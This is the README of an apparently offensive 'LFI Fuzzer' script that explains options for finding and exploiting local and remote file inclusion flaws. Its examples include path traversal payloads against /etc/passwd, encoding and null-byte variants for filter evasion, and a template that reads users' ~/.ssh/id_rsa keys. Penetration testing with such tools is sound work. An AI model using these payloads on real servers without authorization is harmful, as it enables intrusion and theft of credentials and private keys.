## LFI Fuzzer
A script to find and exploit LFI/RFI vulnerabilities with handy options.


### How to use

Get a copy of lfi_fuzzer.py, list arguments with
```
python lfi_fuzzer.py -h
```

Simple example

```
python lfi_fuzzer.py -u http://localhost/?page= -w lfi_list.txt
```

### Arguments

###### nb_parent
Number of directories we need to traverse up

```
-p / --nb_parent 5
../../../../../
```


###### urlencode

```
without urlencode
../../page_xx'xx

-e / --urlencode 1
..%2F..%2Fpage_xx%27xx

-ec / --urlencode 2
..%252F..%252Fpage_xx%2527xx
```

###### path_prefix
Real or fake path to add before anything in the payload

```
-r / --path_prefix xxx/
xxx/../../etc/passwd

-r / --path_prefix /var/www/html/
/var/www/html/../../etc/passwd
```

###### append_null
Add a null charactacter at the end of the payload

```
-n / --append_null
xxx/../../etc/passwd\0
```

###### traversal_method

Use various traversal method

```
-m / --traversal_method 0
../

-m / --traversal_method 1
..//

-m / --traversal_method 2
....//

-m / --traversal_method 999
This is the random method. Results may varies depending on HTTP servers and payloads. Some payload may just work or not, you should try at least 5 to make sure.
./..../.././///./././/..//..//././//../
```

###### stress

Try everything against a single hardcoded payload (/etc/passwd) : between 6-10 directory parents, every encoding, every traversal method, and a few prefixes, including your own.

```
-s / --stress
-s / --stress --path_prefix xxx/
```

###### output

Just output payloads instead of try them

```
-o / --output
```

###### download

Enable downloading files

```
-d / --download
```

###### verbose

Enable (not so much) verbose output. Just add actual payload in the output
```
-v / --verbose
```

###### var

Replace `[VAR]` placeholder in a payload by your own value

```
-x / --var Billy

../../home/[VAR]/.ssh/id_rsa

../../home/Billy/.ssh/id_rsa

```

###### min_length

Minimum response length

```
-l / --min-length 159
```

###### success_string

Validating string to look for

```
-ss / --success_string "root:x:0"
```

###### error_string

Failure string to look for

```
-es / --error_string "Failed to open stream: No such file or directory"
```


